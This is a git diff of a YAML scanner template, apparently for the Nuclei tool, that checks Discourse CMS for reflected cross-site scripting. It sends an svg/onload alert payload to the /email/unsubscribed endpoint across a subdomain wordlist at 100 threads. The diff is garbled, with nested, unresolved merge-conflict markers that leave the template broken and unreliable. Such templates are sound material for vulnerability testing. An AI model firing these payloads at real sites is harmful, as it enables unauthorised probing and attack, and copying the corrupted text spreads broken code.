@@ -1,6 +1,7 @@
-id: Discourse XSS
+id: discourse-xss
 
 info:
+<<<<<<< HEAD
 <<<<<<< HEAD
   name: Discourse CMS XSS
   author: madrobot
@@ -28,24 +29,55 @@ requests:
 =======
       - '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E'
 >>>>>>> 5d36d276 (add new stuff)
+=======
+  name: Discourse CMS - XSS
+  author: madrobot
+  severity: medium
+  description: Cross-site scripting (XSS) on Discourse CMS
+  tags: xss,discourse
+
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        GET /email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+>>>>>>> 18ddf72b (add new stuff)
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
+
       - type: word
         words:
+<<<<<<< HEAD
 <<<<<<< HEAD
           - "<svg/onload=alert(1337)>"
         part: body
 =======
           - "<svg/onload=alert(/xss/)>"
         part: body
+=======
+          - "<svg/onload=alert(xss)>"
+        part: body
+>>>>>>> 18ddf72b (add new stuff)
 
       - type: word
         words:
           - "text/html"
+<<<<<<< HEAD
         part: header
 
 # Enhanced by md on 2022/09/20
 >>>>>>> 5d36d276 (add new stuff)
+=======
+        part: header
+>>>>>>> 18ddf72b (add new stuff)
